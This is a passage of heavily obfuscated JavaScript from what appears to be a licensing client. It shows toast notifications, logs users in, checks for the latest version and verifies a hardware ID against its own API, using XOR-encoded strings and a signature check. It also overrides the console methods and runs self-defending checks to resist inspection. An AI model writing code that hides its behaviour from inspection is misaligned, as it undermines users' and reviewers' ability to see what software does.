      "mty0ota2ndbRz29MveS",
    ];
    return (Ig = function () {
      return t;
    })();
  }
  !(function (t) {
    const e = 370,
      n = 313,
      r = 321,
      o = 330,
      i = 288,
      s = 346,
      a = 378,
      u = 297,
      c = 323,
      l = 294,
      d = kg,
      f = t();
    for (; []; )
      try {
        if (
          293693 ===
          (-parseInt(d(e)) / 1) * (parseInt(d(382)) / 2) +
            (parseInt(d(n)) / 3) * (-parseInt(d(r)) / 4) +
            (-parseInt(d(o)) / 5) * (-parseInt(d(i)) / 6) +
            -parseInt(d(s)) / 7 +
            -parseInt(d(a)) / 8 +
            (parseInt(d(u)) / 9) * (parseInt(d(c)) / 10) +
            (-parseInt(d(l)) / 11) * (-parseInt(d(348)) / 12)
        )
          break;
        f.push(f.shift());
      } catch (h) {
        f.push(f.shift());
      }
  })(Ig);
  const Sg = (function () {
      let t = !![];
      return function (e, n) {
        const r = t
          ? function () {
              if (n) {
                const t = n[kg(363)](e, arguments);
                return (n = null), t;
              }
            }
          : function () {};
        return (t = ![]), r;
      };
    })(),
    _g = Sg(void 0, function () {
      const t = kg;
      return _g
        .toString()
        [t([347][0])]("(((.+)+)+)+$")
        .toString()
        [t(270) + "r"](_g)
        .search("(((.+)+)+)+$");
    });
  _g();
  const Tg = (function () {
      let t = !![];
      return function (e, n) {
        const r = t
          ? function () {
              if (n) {
                const t = n.apply(e, arguments);
                return (n = null), t;
              }
            }
          : function () {};
        return (t = ![]), r;
      };
    })(),
    Cg = Tg(void 0, function () {
      const t = 362,
        e = 354,
        n = 283,
        r = 296,
        o = 278,
        i = 273,
        s = 336,
        a = kg,
        u = {
          BdJeX: function (t, e) {
            return t + e;
          },
        };
      (u[a(383)] = a(t) + "nction() "),
        (u[a(e)] = "trace"),
        (u[a(327)] = function (t, e) {
          return t < e;
        });
      const c = u,
        l = (function () {
          const t = a;
          let e;
          try {
            e = Function(
              c.BdJeX(c.KCbfd + '{}.constructor("retu' + t(277) + " )", ");")
            )();
          } catch (n) {
            e = window;
          }
          return e;
        })(),
        d = (l[a(n)] = l.console || {}),
        f = [a(r), a(o), "info", a(304), "exception", a(i), c.DPAvE];
      for (let h = 0; c[a(327)](h, f.length); h++) {
        const t = Tg.constructor.prototype[a(s)](Tg),
          e = f[h],
          n = d[e] || t;
        (t.__proto__ = Tg.bind(Tg)),
          (t.toString = n.toString.bind(n)),
          (d[e] = t);
      }
    });
  Cg(),
    (window[Ag(300)] = function (t) {
      return function () {
        return t;
      };
    });
  const Bg = (t, e) => {
    const n = 386,
      r = 377,
      o = 372,
      i = 281,
      s = 331,
      a = 353,
      u = 290,
      c = 275,
      l = 387,
      d = 364,
      f = 367,
      h = 340,
      p = 291,
      m = 314,
      g = 299,
      y = 316,
      w = 343,
      b = 335,
      v = 306,
      A = 388,
      k = 322,
      I = 353,
      S = 275,
      _ = 385,
      T = 360,
      C = 326,
      B = 356,
      E = 302,
      x = 303,
      P = 295,
      R = 289,
      O = 344,
      M = 311,
      L = 337,
      N = 271,
      D = 332,
      U = 366,
      q = 374,
      W = 338,
      z = 333,
      K = 305,
      F = 282,
      j = 286,
      G = 315,
      V = 310,
      H = 304,
      X = 298,
      Z = 299,
      J = 351,
      Y = 339,
      Q = 324,
      $ = 352,
      tt = 361,
      et = 358,
      nt = 312,
      rt = 299,
      ot = 384,
      it = 309,
      st = 350,
      at = 307,
      ut = 287,
      ct = 371,
      lt = 357,
      dt = 292,
      ft = 279,
      ht = 322,
      pt = 308,
      mt = 353,
      gt = 325,
      yt = 276,
      wt = 299,
      bt = 375,
      vt = 328,
      At = 379,
      kt = 301,
      It = 369,
      St = 272,
      _t = 341,
      Tt = 365,
      Ct = 322,
      Bt = 373,
      Et = Ag,
      xt = {
        vCMDd: "100%",
        wNvMQ: function (t, e, n) {
          return t(e, n);
        },
        lCzMw: Et(284) + "on-container",
        kfIRC: function (t, e) {
          return t === e;
        },
        wIzeC: Et(355),
        kmbic: function (t, e) {
          return t === e;
        },
        bQxdM: Et(n),
        tALCp: Et(r),
        IKKtc: Et(o),
        eToAI: function (t, e, n) {
          return t(e, n);
        },
        kKKoD: function (t, e, n) {
          return t(e, n);
        },
      };
    let Pt = document[Et(359) + Et(i)](xt.lCzMw);
    !Pt &&
      ((Pt = document[Et(s) + Et(a)]("div")),
      (Pt.id = "notification-container"),
      (Pt[Et(u)][Et(c)] =
        "\n            position: fixed;\n          " +
        Et(l) +
        Et(d) +
        "     left: 50%;\n    " +
        Et(380) +
        "ansform: translateX(" +
        Et(f) +
        "         z" +
        Et(h) +
        "00000;\n   " +
        Et(p) +
        Et(m) +
        "ex;\n      " +
        Et(319) +
        "-direction: column-reverse;\n  " +
        Et(g) +
        Et(334) +
        "s: center;" +
        Et(y) +
        "   gap: 15px;\n            width: 100%;\n           " +
        Et(w) +
        Et(b) +
        "          " +
        Et(293) +
        Et(v) +
        "e;\n        "),
      document[Et(A)][Et(k) + "d"](Pt));
    const Rt = document["createElem" + Et(I)]("div");
    Rt.style[Et(S)] =
      "\n        b" +
      Et(_) +
      " " +
      (xt.kfIRC(e, xt.wIzeC)
        ? Et(T)
        : xt[Et(C)](e, xt.bQxdM)
        ? "#FF9800"
        : "#F44336") +
      ";\n        " +
      Et(274) +
      Et(B) +
      "  padding: 20px 25px;\n        " +
      Et(E) +
      "ius: 6px;\n        font-family: 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;\n        width: 100%;\n " +
      Et(x) +
      "-shadow: 0" +
      Et(P) +
      "rgba(0, 0, 0, 0.15);" +
      Et(368) +
      "pacity: 0;\n        t" +
      Et(R) +
      Et(O) +
      "(-20px);\n        ani" +
      Et(M) +
      "deIn 0.3s ease-out forwards;\n        overflow: hid" +
      Et(L) +
      Et(N) +
      Et(318) +
      Et(285) +
      " pointer-events: auto;\n       " +
      Et(D) +
      "g: border-" +
      Et(U);
    const Ot = document.createElement("div");
    Ot.style.cssText =
      "\n        p" +
      Et(q) +
      "bsolute;\n        bot" +
      Et(W) +
      "      left" +
      Et(z) +
      Et(K) +
      " 4px;\n        width:" +
      Et(F) +
      Et(j) +
      "round: rgba(0, 0, 0, 0.2);\n    ";
    const Mt = document["createElem" + Et(I)]("div");
    Mt.style[Et(S)] =
      "\n        height: 100%;\n        width: 0;\n        background:" +
      Et(280) +
      " 255, 255, 0.9);\n        trans" +
      Et(G) +
      "th 3s line" +
      Et(342);
    const Lt = { success: "✅", warning: "⚠️", error: "🚨" },
      Nt = Lt,
      Dt = {};
    (Dt.success = Et(V)), (Dt.warning = xt.tALCp), (Dt[Et(H)] = xt.IKKtc);
    const Ut = Dt;
    (Rt.innerHTML =
      '\n        <div style="\n        ' +
      Et(X) +
      "y: flex;\n " +
      Et(Z) +
      Et(J) +
      Et(Y) +
      Et(320) +
      "    margin-bottom: 8" +
      Et(Q) +
      "      font-weight: 600;\n            font-size: 1.1" +
      Et($) +
      Et(tt) +
      "       <sp" +
      Et(et) +
      Et(376) +
      "ht: 10px; " +
      Et(317) +
      ' 1.4em;">' +
      Nt[e] +
      (Et(nt) + Et(rt) + Et(ot)) +
      Ut[e] +
      Et(nt) +
      "      </div>\n       " +
      Et(it) +
      Et(st) +
      "      marg" +
      Et(at) +
      Et(ut) +
      "         line-height: 1.5;\n   " +
      Et(ct) +
      "ont-weight" +
      Et(lt) +
      Et(dt) +
      t +
      Et(ft) +
      " "),
      Ot[Et(ht) + "d"](Mt),
      Rt.appendChild(Ot),
      Pt.insertBefore(Rt, Pt.firstChild);
    const qt = "notificati" + Et(pt) + "on-styles";
    let Wt = document.getElementById(qt);
    !Wt &&
      ((Wt = document["createElem" + Et(mt)](Et(290))),
      (Wt.id = qt),
      (Wt.textContent =
        Et(316) +
        Et(gt) +
        Et(yt) +
        " {\n                to { \n                    opacity: 1;\n   " +
        Et(wt) +
        Et(bt) +
        Et(vt) +
        Et(At) +
        Et(kt) +
        "         }\n         " +
        Et(It) +
        Et(329) +
        Et(St) +
        "deOut {\n  " +
        Et(rt) +
        Et(_t) +
        "pacity: 0;" +
        Et(381) +
        Et(Tt) +
        "     "),
      document.head[Et(Ct) + "d"](Wt)),
      xt[Et(349)](
        setTimeout,
        () => {
          const t = Et;
          Mt.style.width = xt[t(Bt)];
        },
        10
      ),
      xt[Et(345)](
        setTimeout,
        () => {
          const t = {
              fuGvf: function (t, e) {
                return t === e;
              },
            },
            e = t;
          (Rt.style.opacity = "0"),
            xt.wNvMQ(
              setTimeout,
              () => {
                Rt.remove(),
                  Pt && e.fuGvf(Pt.children.length, 0) && Pt.remove();
              },
              300
            );
        },
        3e3
      );
  };
  axiom;
  const Eg = xg;
  function xg(t, e) {
    const n = Pg();
    return (
      (xg = function (e, r) {
        let o = n[(e -= 183)];
        if (void 0 === xg.bJmYez) {
          var i = function (t) {
            let e = "",
              n = "",
              r = e + i;
            for (
              let o, i, s = 0, a = 0;
              (i = t.charAt(a++));
              ~i && ((o = s % 4 ? 64 * o + i : i), s++ % 4)
                ? (e +=
                    r.charCodeAt(a + 10) - 10 != 0
                      ? String.fromCharCode(255 & (o >> ((-2 * s) & 6)))
                      : s)
                : 0
            )
              i =
                "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=".indexOf(
                  i
                );
            for (let o = 0, i = e.length; o < i; o++)
              n += "%" + ("00" + e.charCodeAt(o).toString(16)).slice(-2);
            return decodeURIComponent(n);
          };
          (xg.erQJVg = i), (t = arguments), (xg.bJmYez = !![]);
        }
        const s = e + n[0],
          a = t[s];
        if (a) o = a;
        else {
          const e = function (t) {
            (this.jaNBQF = t),
              (this.tkPOdg = [1, 0, 0]),
              (this.djNbdC = function () {
                return "newState";
              }),
              (this.HLVxWf = "\\w+ *\\(\\) *{\\w+ *"),
              (this.GlHJxb = "['|\"].+['|\"];? *}");
          };
          (e.prototype.OWdAWx = function () {
            const t = new RegExp(this.HLVxWf + this.GlHJxb).test(
              this.djNbdC.toString()
            )
              ? --this.tkPOdg[1]
              : --this.tkPOdg[0];
            return this.FCBFsy(t);
          }),
            (e.prototype.FCBFsy = function (t) {
              return Boolean(~t) ? this.qAGwsh(this.jaNBQF) : t;
            }),
            (e.prototype.qAGwsh = function (t) {
              for (let e = 0, n = this.tkPOdg.length; e < n; e++)
                this.tkPOdg.push(Math.round(Math.random())),
                  (n = this.tkPOdg.length);
              return t(this.tkPOdg[0]);
            }),
            new e(xg).OWdAWx(),
            (o = xg.erQJVg(o)),
            (t[s] = o);
        }
        return o;
      }),
      xg(t, e)
    );
  }
  function Pg() {
    const t = [
      "AvDNz1a",
      "qxHpEMu",
      "u21tvKi",
      "z2v0sw5ZDgfUyW",
      "r0vu",
      "DMfPA0G",
      "Dg9tDhjPBMC",
      "yxbWBhK",
      "Dg9Rzw4",
      "z2v0vg9Rzw4",
      "DMfUAxr5",
      "CM9Y",
      "uNbJ",
      "DMvYC2LVBG",
      "x19WCM90B19F",
      "CvjdrMO",
      "s0npAKe",
      "thjQAKq",
      "DMPVq1m",
      "zxjZAw9U",
      "wMfkEeW",
      "y3vYCMvUDfrVAW",
      "qvbjx0jbu0u",
      "zgLZy29UBMvJDa",
      "rMvhEha",
      "mtjqqwPYywO",
      "mtjmDuDsr3i",
      "tNfdzK0",
      "mZGWntLkseHvB0G",
      "DgnZzuy",
      "mJeWnZGZmgT2DeDeDq",
      "zgf0yq",
      "EefQqu0",
      "y29UC3rYDwn0BW",
      "ANnVBG",
      "yu9XEwe",
      "mty1ode2n0Txt2jNtG",
      "t0TzrMW",
      "yMjUz3y",
      "z2v0q29UBMvJDa",
      "ofbbwK10zq",
      "y29UC29Szq",
      "qwnyDwO",
      "Aw9U",
      "C2vHCMnO",
      "CNjvywu",
      "s2HxC1G",
      "svjPrLK",
      "B2jQzwn0",
      "mti4tNnWDNbS",
      "mJy0mdeXodHPwhnczvG",
      "AgfZvg9Rzw4",
      "yMLUza",
      "zgvJB2rL",
      "mJm1nJeZmwPhwLfTuG",
      "BeDIq1u",
      "Bg9N",
      "BgvUz3rO",
      "C3rYAw5NAwz5",
      "Bu56Eei",
      "ntaYmZbtALfLqNG",
      "CMv0DxjUicHMDq",
      "mJu4nduZnuDIDxftza",
      "C1jVBue",
      "qvbjx1bvqL9lrq",
      "v3rstfi",
      "BwfZEKS",
      "t3zMz08",
      "mtuZzvHAzK9j",
      "sM9vEM4",
      "sNnnrLe",
      "z2v0uNbJq2XPzq",
      "vKrhvhu",
      "C3rYAw5N",
      "y01tv3G",
      "suDYwxm",
      "zxHJzxb0Aw9U",
      "tLrZCMC",
      "wfv2wg0",
      "zhz0uwW",
      "BwvZC2fNzq",
      "vhj5shm",
      "Aw5MBW",
      "zxjYB3i",
      "suXSvha",
      "DhjHy2u",
      "C3vJy2vZCW",
    ];
    return (Pg = function () {
      return t;
    })();
  }
  (function (t) {
    const e = 232,
      n = 226,
      r = 250,
      o = 236,
      i = 258,
      s = 222,
      a = 224,
      u = 245,
      c = 264,
      l = 256,
      d = 246,
      f = 221,
      h = xg,
      p = t();
    for (; []; )
      try {
        if (
          850515 ===
          parseInt(h(e)) / 1 +
            parseInt(h(n)) / 2 +
            (parseInt(h(r)) / 3) * (parseInt(h(o)) / 4) +
            (-parseInt(h(i)) / 5) * (parseInt(h(s)) / 6) +
            (parseInt(h(a)) / 7) * (parseInt(h(u)) / 8) +
            (parseInt(h(c)) / 9) * (-parseInt(h(l)) / 10) +
            (-parseInt(h(d)) / 11) * (parseInt(h(f)) / 12)
        )
          break;
        p.push(p.shift());
      } catch (m) {
        p.push(p.shift());
      }
  })(Pg),
    (window.skCrypt = function (t) {
      return function () {
        return t;
      };
    });
  const Rg = class {
    static setToken(t) {
      this.currentToken = t;
    }
    static clearToken() {
      this.currentToken = null;
    }
    static [Eg(205)]() {
      return this.currentToken;
    }
    static [Eg(247)]() {
      return null !== this.currentToken;
    }
    static async login(t, e) {
      const n = 218,
        r = 204,
        o = 262,
        i = 231,
        s = Eg,
        a = {
          IRiFY: function (t, e) {
            return t < e;
          },
          hlmPh: function (t, e) {
            return t >>> e;
          },
          JsMFQ: function (t, e) {
            return t * e;
          },
          vjoCS: function (t, e) {
            return t % e;
          },
          BXMzD: function (t, e) {
            return t ^ e;
          },
          PaOgE: function (t, e) {
            return t & e;
          },
          coTSY: function (t, e) {
            return t ^ e;
          },
          ILlTp: function (t, e) {
            return t % e;
          },
          CICeZ: function (t, e) {
            return t + e;
          },
          FeGxp: s(192),
          WtRLR: function (t) {
            return t();
          },
          aOqya: function (t, e, n) {
            return t(e, n);
          },
          maszK: function (t) {
            return t();
          },
          wbufa: function (t, e) {
            return t === e;
          },
        };
      try {
        const i = a.CICeZ(
            this[s(n)] +
              (function () {
                const t = 253,
                  e = 249,
                  n = {
                    vaikH: function (t, e) {
                      return t >>> e;
                    },
                    Cufry: function (t, e) {
                      return t * e;
                    },
                    koRBH: function (t, e) {
                      return t % e;
                    },
                  },
                  r = n;
                let o;
                return function () {
                  const n = xg;
                  if (!o) {
                    const i = new Uint8Array([
                        54, 216, 24, 223, 113, 150, 1, 196, 126, 208, 3, 148,
                        108, 202, 8, 217, 119, 216, 0, 206, 36,
                      ]),
                      s = -1418872551,
                      a = new Uint8Array(i.length);
                    for (let e = 0; e < i[n(t)]; e++) {
                      const t = 255 & r[n(201)](s, r.Cufry(r.koRBH(e, 4), 8));
                      a[e] = i[e] ^ t;
                    }
                    o = new TextDecoder()[n(e)](a);
                  }
                  return o;
                };
              })()() +
              t.username +
              (function () {
                const t = 253,
                  e = 249,
                  n = {
                    EVind: function (t, e) {
                      return t % e;
                    },
                  },
                  r = n;
                let o;
                return function () {
                  const n = xg;
                  if (!o) {
                    const i = new Uint8Array([57, 209, 26, 194, 123, 132]),
                      s = -1418872545,
                      a = new Uint8Array(i[n(t)]);
                    for (let t = 0; t < i[n(253)]; t++) {
                      const e = (s >>> (8 * r.EVind(t, 4))) & 255;
                      a[t] = i[t] ^ e;
                    }
                    o = new TextDecoder()[n(e)](a);
                  }
                  return o;
                };
              })()(),
            encodeURIComponent(e)
          ),
          u = { method: "POST" },
          c = await fetch(i, u);
        if (!c.ok)
          return (
            C(),
            Bg(
              (function () {
                let t;
                return function () {
                  if (!t) {
                    const e = new Uint8Array([
                        85, 214, 10, 194, 119, 153, 11, 202, 112, 213, 8, 207,
                        57, 206, 4, 223, 113, 153, 30, 223, 120, 205, 24, 216,
                        35, 153,
                      ]),
                      n = -1418872551,
                      r = new Uint8Array(e.length);
                    for (let t = 0; t < e.length; t++) {
                      const o = (n >>> ((t % 4) * 8)) & 255;
                      r[t] = e[t] ^ o;
                    }
                    t = new TextDecoder().decode(r);
                  }
                  return t;
                };
              })()() + c.status,
              "error"
            ),
            null
          );
        const l = await c.json();
        if (!l.data.success)
          return (
            Bg(
              (function () {
                const t = 214,
                  e = 249;
                let n;
                return function () {
                  const r = xg;
                  if (!n) {
                    const o = new Uint8Array([
                        87, 214, 10, 194, 117, 153, 11, 202, 114, 213, 8, 207,
                      ]),
                      i = -1418872549,
                      s = new Uint8Array(o.length);
                    for (let e = 0; a.IRiFY(e, o.length); e++) {
                      const n = 255 & a.hlmPh(i, a.JsMFQ(a[r(t)](e, 4), 8));
                      s[e] = a.BXMzD(o[e], n);
                    }
                    n = new TextDecoder()[r(e)](s);
                  }
                  return n;
                };
              })()(),
              a.FeGxp
            ),
            null
          );
        if (!(await J(l)))
          return (
            a[s(261)](C),
            a.aOqya(
              Bg,
              (function () {
                const t = 253;
                let e;
                return function () {
                  const n = xg;
                  if (!e) {
                    const r = new Uint8Array([
                        85, 214, 10, 194, 119, 153, 4, 197, 109, 220, 10, 217,
                        112, 205, 20, 139, 122, 209, 8, 200, 114, 153, 11, 202,
                        112, 213, 8, 207, 56,
                      ]),
                      o = -1418872551,
                      i = new Uint8Array(r.length);
                    for (let e = 0; e < r[n(t)]; e++) {
                      const t = (o >>> ((e % 4) * 8)) & 255;
                      i[e] = a.BXMzD(r[e], t);
                    }
                    e = new TextDecoder().decode(i);
                  }
                  return e;
                };
              })()(),
              a.FeGxp
            ),
            null
          );
        if ((await Z(l, this.API_PUB_KEY)) && l.data[s(r)]) {
          const t = l.data.token;
          return this.setToken(t), t;
        }
        return (
          Bg(
            (function () {
              const t = 253;
              let e;
              return function () {
                const n = xg;
                if (!e) {
                  const r = new Uint8Array([
                      91, 214, 10, 194, 121, 153, 27, 206, 101, 208, 11, 194,
                      116, 216, 25, 194, 120, 215, 77, 205, 118, 208, 1, 206,
                      115, 152,
                    ]),
                    o = -1418872553,
                    i = new Uint8Array(r.length);
                  for (let e = 0; e < r[n(t)]; e++) {
                    const t = a.PaOgE(o >>> ((e % 4) * 8), 255);
                    i[e] = a.coTSY(r[e], t);
                  }
                  e = new TextDecoder().decode(i);
                }
                return e;
              };
            })()(),
            a[s(220)]
          ),
          a[s(o)](C),
          null
        );
      } catch (u) {
        let t = "Unknown error";
        return (
          u instanceof Error
            ? (t = u.message)
            : "string" == typeof u
            ? (t = u)
            : u && a.wbufa(typeof u, "object") && (t = JSON[s(254)](u)),
          a[s(i)](
            Bg,
            a.CICeZ(
              (function () {
                const t = 253,
                  e = 243,
                  n = 266,
                  r = 193,
                  o = 249;
                let i;
                return function () {
                  const s = xg;
                  if (!i) {
                    const u = new Uint8Array([
                        85, 214, 10, 194, 119, 153, 11, 202, 112, 213, 8, 207,
                        57, 206, 4, 223, 113, 153, 8, 217, 107, 214, 31, 145,
                        57,
                      ]),
                      c = -1418872551,
                      l = new Uint8Array(u[s(t)]);
                    for (let t = 0; a[s(e)](t, u.length); t++) {
                      const e = (c >>> a[s(n)](a[s(r)](t, 4), 8)) & 255;
                      l[t] = u[t] ^ e;
                    }
                    i = new TextDecoder()[s(o)](l);
                  }
                  return i;
                };
              })()(),
              t
            ),
            a.FeGxp
          ),
          null
        );
      }
    }
    static async ["getLatestV" + Eg(215)]() {
      const t = 218,
        e = 200,
        n = 195,
        r = 259,
        o = 227,
        i = 251,
        s = 254,
        a = 249,
        u = 253,
        c = 253,
        l = 249,
        d = 253,
        f = 196,
        h = 188,
        p = 187,
        m = 253,
        g = Eg,
        y = {
          LGhvJ: function (t, e) {
            return t % e;
          },
          rrUae: function (t, e) {
            return t ^ e;
          },
          bShgw: function (t, e) {
            return t & e;
          },
          iWggP: function (t, e) {
            return t < e;
          },
          dvtQl: function (t, e) {
            return t & e;
          },
          XUvXm: function (t, e) {
            return t * e;
          },
          uYCMK: function (t, e) {
            return t & e;
          },
          kgLFV: function (t, e, n) {
            return t(e, n);
          },
          sRomA: function (t, e) {
            return t !== e;
          },
          NuCer: "error",
          mOLuA: "Unknown error",
          lGbCU: function (t, e) {
            return t === e;
          },
          LrjjD: g(244),
        };
      try {
        const i =
            this[g(t)] +
            (function () {
              const t = 253;
              let e;
              return function () {
                const n = xg;
                if (!e) {
                  const r = new Uint8Array([
                      52, 222, 8, 223, 87, 216, 25, 206, 104, 205, 59, 206, 105,
                      202, 4, 196, 117,
                    ]),
                    o = -1418872549,
                    i = new Uint8Array(r[n(t)]);
                  for (let e = 0; e < r[n(t)]; e++) {
                    const t = (o >>> ((e % 4) * 8)) & 255;
                    i[e] = r[e] ^ t;
                  }
                  e = new TextDecoder().decode(i);
                }
                return e;
              };
            })()(),
          s = {};
        s.method = g(e);
        const a = await y.kgLFV(fetch, i, s);
        if (!a.ok)
          return (
            C(),
            Bg(
              (function () {
                const t = 241,
                  e = function (t, e) {
                    return y.LGhvJ(t, e);
                  },
                  n = function (e, n) {
                    return y[xg(t)](e, n);
                  };
                let r;
                return function () {
                  const t = xg;
                  if (!r) {
                    const o = new Uint8Array([
                        75, 220, 28, 222, 124, 202, 25, 139, 127, 216, 4, 199,
                        124, 221, 77, 220, 112, 205, 5, 139, 106, 205, 12, 223,
                        108, 202, 87, 139,
                      ]),
                      i = -1418872551,
                      s = new Uint8Array(o.length);
                    for (let r = 0; r < o[t(m)]; r++) {
                      const t = (i >>> (8 * e(r, 4))) & 255;
                      s[r] = n(o[r], t);
                    }
                    r = new TextDecoder().decode(s);
                  }
                  return r;
                };
              })()() + a.status,
              "error"
            ),
            null
          );
        const w = await a.json();
        if (
          !w.data[g(n)] ||
          y[g(r)](
            w[g(o)][g(209)],
            (function () {
              let t;
              return function () {
                if (!t) {
                  const e = new Uint8Array([45, 151, 94]),
                    n = -1418872545,
                    r = new Uint8Array(e.length);
                  for (let t = 0; t < e.length; t++) {
                    const o = y.bShgw(n >>> (8 * y.LGhvJ(t, 4)), 255);
                    r[t] = e[t] ^ o;
                  }
                  t = new TextDecoder().decode(r);
                }
                return t;
              };
            })()()
          )
        )
          return (
            y.kgLFV(
              Bg,
              (function () {
                let t;
                return function () {
                  const e = xg;
                  if (!t) {
                    const n = new Uint8Array([
                        93, 214, 26, 197, 117, 214, 12, 207, 57, 205, 5, 206,
                        57, 213, 12, 223, 124, 202, 25, 139, 111, 220, 31, 216,
                        112, 214, 3,
                      ]),
                      r = -1418872551,
                      o = new Uint8Array(n[e(d)]);
                    for (let t = 0; y[e(f)](t, n.length); t++) {
                      const i = y[e(h)](r >>> y[e(p)](t % 4, 8), 255);
                      o[t] = y.rrUae(n[t], i);
                    }
                    t = new TextDecoder().decode(o);
                  }
                  return t;
                };
              })()(),
              "warning"
            ),
            null
          );
        return (await J(w))
          ? !![]
          : (C(),
            Bg(
              (function () {
                let t;
                return function () {
                  const e = xg;
                  if (!t) {
                    const n = new Uint8Array([
                        82, 215, 25, 206, 124, 203, 4, 223, 98, 153, 14, 195,
                        126, 218, 6, 139, 125, 216, 4, 199, 126, 221, 76,
                      ]),
                      r = -1418872549,
                      o = new Uint8Array(n[e(u)]);
                    for (let t = 0; y.iWggP(t, n[e(c)]); t++) {
                      const e = y.uYCMK(r >>> y.XUvXm(t % 4, 8), 255);
                      o[t] = n[t] ^ e;
                    }
                    t = new TextDecoder()[e(l)](o);
                  }
                  return t;
                };
              })()(),
              y.NuCer
            ),
            null);
      } catch (w) {
        let t = y.mOLuA;
        return (
          w instanceof Error
            ? (t = w.message)
            : y.lGbCU(typeof w, "string")
            ? (t = w)
            : w && y[g(i)](typeof w, y[g(213)]) && (t = JSON[g(s)](w)),
          Bg(
            (function () {
              const t = {
                  WvRCJ: function (t, e) {
                    return t >>> e;
                  },
                },
                e = t;
              let n;
              return function () {
                const t = xg;
                if (!n) {
                  const r = new Uint8Array([
                      75, 220, 28, 222, 124, 202, 25, 139, 127, 216, 4, 199,
                      124, 221, 77, 220, 112, 205, 5, 139, 124, 203, 31, 196,
                      107, 131, 77,
                    ]),
                    o = -1418872551,
                    i = new Uint8Array(r.length);
                  for (let t = 0; t < r.length; t++) {
                    const n = 255 & e.WvRCJ(o, (t % 4) * 8);
                    i[t] = r[t] ^ n;
                  }
                  n = new TextDecoder()[t(a)](i);
                }
                return n;
              };
            })()() + t,
            y.NuCer
          ),
          null
        );
      }
    }
    static async checkHwid(t, e) {
      const n = 269,
        r = 218,
        o = 211,
        i = 198,
        s = 212,
        a = 234,
        u = 192,
        c = 197,
        l = 207,
        d = 244,
        f = 253,
        h = 249,
        p = 242,
        m = 238,
        g = Eg,
        y = {
          JoUzn: function (t, e) {
            return t & e;
          },
          cMSWx: function (t, e) {
            return t ^ e;
          },
          zSZpg: function (t, e) {
            return t < e;
          },
          MWjGX: function (t, e) {
            return t & e;
          },
          Lggbc: function (t, e) {
            return t >>> e;
          },
          KhWsX: function (t, e) {
            return t % e;
          },
          AcXuj: function (t, e) {
            return t ^ e;
          },
          WndMd: function (t, e) {
            return t >>> e;
          },
          jqaOK: function (t, e) {
            return t + e;
          },
          tcseF: function (t, e) {
            return t(e);
          },
          SmSVB: function (t, e, n) {
            return t(e, n);
          },
          qRCFj: "GET",
          YpTkJ: g(192),
          KCOjA: "warning",
          bbngv: function (t, e) {
            return t(e);
          },
          MfAmC: function (t) {
            return t();
          },
          AxOze: function (t) {
            return t();
          },
          SwAKA: g(n),
        };
      try {
        const n =
            y.jqaOK(
              this[g(r)],
              (function () {
                const t = 253;
                let e;
                return function () {
                  const n = xg;
                  if (!e) {
                    const r = new Uint8Array([
                        40, 218, 5, 206, 100, 210, 37, 220, 110, 221, 82, 222,
                        116, 220, 31, 197, 102, 212, 8, 150,
                      ]),
                      o = -1418872569,
                      i = new Uint8Array(r[n(t)]);
                    for (let t = 0; t < r.length; t++) {
                      const e = y.JoUzn(o >>> ((t % 4) * 8), 255);
                      i[t] = r[t] ^ e;
                    }
                    e = new TextDecoder()[n(249)](i);
                  }
                  return e;
                };
              })()()
            ) +
            t +
            (function () {
              let t;
              return function () {
                if (!t) {
                  const e = new Uint8Array([63, 209, 26, 194, 125, 132]),
                    n = -1418872551,
                    r = new Uint8Array(e.length);
                  for (let t = 0; t < e.length; t++) {
                    const o = (n >>> ((t % 4) * 8)) & 255;
                    r[t] = y.cMSWx(e[t], o);
                  }
                  t = new TextDecoder().decode(r);
                }
                return t;
              };
            })()() +
            y[g(225)](encodeURIComponent, e),
          l = await y.SmSVB(fetch, n, { method: y[g(o)] });
        if (!l.ok)
          return (
            Bg(
              (function () {
                const t = 263,
                  e = 253,
                  n = 186,
                  r = 265,
                  o = {
                    OvfgO: function (t, e) {
                      return y.zSZpg(t, e);
                    },
                    Mfxjk: function (t, e) {
                      return y[xg(r)](t, e);
                    },
                    NTsrg: function (t, e) {
                      return t ^ e;
                    },
                  };
                let i;
                return function () {
                  const r = xg;
                  if (!i) {
                    const s = new Uint8Array([
                        83, 238, 36, 239, 59, 207, 8, 217, 114, 223, 4, 200,
                        122, 205, 4, 196, 117, 153, 11, 202, 114, 213, 8, 207,
                        59, 206, 4, 223, 115, 153, 30, 223, 122, 205, 24, 216,
                        33, 153,
                      ]),
                      a = -1418872549,
                      u = new Uint8Array(s.length);
                    for (let i = 0; o[r(t)](i, s[r(e)]); i++) {
                      const t = o.Mfxjk(a >>> ((i % 4) * 8), 255);
                      u[i] = o[r(n)](s[i], t);
                    }
                    i = new TextDecoder().decode(u);
                  }
                  return i;
                };
              })()() + l.status,
              y.YpTkJ
            ),
            ![]
          );
        const d = await l[g(230)]();
        if (!d.data.success)
          return (
            y[g(i)](
              Bg,
              (function () {
                let t;
                return function () {
                  const e = xg;
                  if (!t) {
                    const n = new Uint8Array([
                        80, 215, 14, 196, 107, 203, 8, 200, 109, 153, 37, 252,
                        80, 253, 77, 207, 124, 205, 8, 200, 109, 220, 9, 133,
                        57, 248, 30, 192, 57, 223, 2, 217, 57, 216, 77, 227, 78,
                        240, 41, 139, 107, 220, 30, 206, 109,
                      ]),
                      r = -1418872551,
                      o = new Uint8Array(n.length);
                    for (let t = 0; t < n.length; t++) {
                      const i = y.MWjGX(y.Lggbc(r, 8 * y[e(p)](t, 4)), 255);
                      o[t] = y[e(m)](n[t], i);
                    }
                    t = new TextDecoder().decode(o);
                  }
                  return t;
                };
              })()(),
              y[g(s)]
            ),
            ![]
          );
        if (!(await y[g(a)](J, d)))
          return (
            Bg(
              (function () {
                const t = 249;
                let e;
                return function () {
                  const n = xg;
                  if (!e) {
                    const r = new Uint8Array([
                        86, 215, 25, 206, 120, 203, 4, 223, 102, 153, 14, 195,
                        122, 218, 6, 139, 121, 216, 4, 199, 122, 221, 76,
                      ]),
                      o = -1418872545,
                      i = new Uint8Array(r.length);
                    for (let t = 0; t < r.length; t++) {
                      const e = 255 & y.Lggbc(o, (t % 4) * 8);
                      i[t] = r[t] ^ e;
                    }
                    e = new TextDecoder()[n(t)](i);
                  }
                  return e;
                };
              })()(),
              "error"
            ),
            y.MfAmC(C),
            ![]
          );
        const w = await Z(d, this[g(260) + "Y"]);
        return (
          w ||
          (y.SmSVB(
            Bg,
            (function () {
              let t;
              return function () {
                const e = xg;
                if (!t) {
